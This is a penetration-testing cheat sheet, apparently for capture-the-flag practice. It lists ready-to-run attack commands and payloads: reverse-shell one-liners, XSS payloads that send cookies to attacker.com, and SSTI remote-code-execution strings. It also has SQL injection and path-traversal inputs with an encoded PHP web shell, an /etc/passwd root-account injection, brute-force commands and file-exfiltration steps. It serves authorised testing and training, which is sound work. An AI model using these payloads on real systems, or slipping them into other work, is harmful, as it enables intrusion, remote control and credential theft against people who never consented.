---
---

# Pentesting Cheatsheet

A quick-reference guide for common penetration testing commands and techniques.

---

## Reconnaissance

### Nmap Scanning

```bash
# Quick TCP scan
nmap -sC -sV -oN nmap/initial <IP>

# Full port scan
nmap -p- --min-rate 10000 -oN nmap/allports <IP>

# UDP scan
nmap -sU --top-ports 50 -oN nmap/udp <IP>

# Vuln scan
nmap --script vuln -oN nmap/vuln <IP>
```

### Directory Enumeration

```bash
# Gobuster
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# ffuf
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302

# Feroxbuster
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### DNS Enumeration

```bash
# Subdomain bruteforce
ffuf -u http://FUZZ.<domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<domain>"

# Zone transfer
dig axfr @<DNS_SERVER> <domain>

# DNS records
dig any <domain> @<DNS_SERVER>
```

---

## Web Exploitation

### SQL Injection

```bash
# SQLMap basic
sqlmap -u "http://<IP>/page?id=1" --dbs

# SQLMap with cookie
sqlmap -u "http://<IP>/page?id=1" --cookie="session=abc123" --dump

# Manual UNION injection
' UNION SELECT 1,2,3,4-- -
' UNION SELECT null,table_name,null,null FROM information_schema.tables-- -

# Blind boolean-based
' AND 1=1-- -
' AND 1=2-- -

# Time-based
' AND SLEEP(5)-- -
```

### XSS Payloads

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Cookie stealing -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

<!-- DOM-based -->
<img src=x onerror="location='https://attacker.com/?c='+document.cookie">
```

### SSTI (Server-Side Template Injection)

```python
# Detection
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### SSRF

```bash
# Basic
http://127.0.0.1
http://localhost
http://[::1]

# Bypasses
http://0x7f000001
http://2130706433
http://017700000001
http://127.1
```

### LFI / Path Traversal

```bash
# Basic
../../../etc/passwd
....//....//....//etc/passwd

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log poisoning
/var/log/apache2/access.log
/var/log/nginx/access.log
```

---

## Reverse Shells

### One-liners

```bash
# Bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (with -e)
nc -e /bin/sh <IP> <PORT>

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

### Shell Stabilization

```bash
# Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background shell
# Press Ctrl+Z

# Step 3: Configure terminal
stty raw -echo; fg

# Step 4: Set terminal type
export TERM=xterm
export SHELL=bash
stty rows <ROWS> columns <COLS>
```

---

## Privilege Escalation

### Linux

```bash
# Quick enumeration
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
getcap -r / 2>/dev/null

# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# SUID exploitation (check GTFOBins)
find / -perm -u=s -type f 2>/dev/null

# Writable /etc/passwd
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# Kernel exploits
uname -a
searchsploit linux kernel <version>
```

### Windows

```powershell
# Enumeration
whoami /all
systeminfo
net user
net localgroup administrators

# WinPEAS
.\winPEASany.exe

# Token impersonation
whoami /priv
# If SeImpersonatePrivilege → JuicyPotato/PrintSpoofer/GodPotato

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
```

---

## Cryptography

### Common Tools

```bash
# Hash identification
hashid '<hash>'
hash-identifier

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --wordlist=rockyou.txt hash.txt

# Hashcat
hashcat -m 0 hash.txt rockyou.txt    # MD5
hashcat -m 1000 hash.txt rockyou.txt  # NTLM
hashcat -m 1800 hash.txt rockyou.txt  # SHA-512 (Unix)

# RSA
python3 RsaCtfTool.py -n <N> -e <E> --uncipher <C>
```

### Encoding/Decoding

```bash
# Base64
echo -n "text" | base64
echo "dGV4dA==" | base64 -d

# Hex
echo -n "text" | xxd -p
echo "74657874" | xxd -r -p

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('payload'))"
```

---

## File Transfer

```bash
# Python HTTP server
python3 -m http.server 8000

# Download with curl/wget
curl http://<IP>:8000/file -o file
wget http://<IP>:8000/file

# Netcat
# Sender:
nc -w 3 <IP> <PORT> < file
# Receiver:
nc -lvnp <PORT> > file

# SCP
scp file user@<IP>:/tmp/

# PowerShell download
Invoke-WebRequest -Uri http://<IP>/file -OutFile file
certutil -urlcache -split -f http://<IP>/file file
```

---

## Password Attacks

```bash
# Hydra - SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# Hydra - HTTP POST
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Hydra - FTP
hydra -l user -P rockyou.txt ftp://<IP>

# CrackMapExec - SMB
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

---

## Useful One-Liners

```bash
# Find flags
find / -name "*.txt" -exec grep -l "flag{" {} \; 2>/dev/null
grep -rn "flag{" / 2>/dev/null

# Compile exploit
gcc exploit.c -o exploit -static

# Port forwarding with SSH
ssh -L <local_port>:127.0.0.1:<remote_port> user@<IP>

# SOCKS proxy
ssh -D 1080 user@<IP>
proxychains nmap -sT <target>

# Extract strings from binary
strings binary | grep -i flag
strings -n 8 binary
```

---

> "Hack the planet!" - Dade Murphy, Hackers (1995)
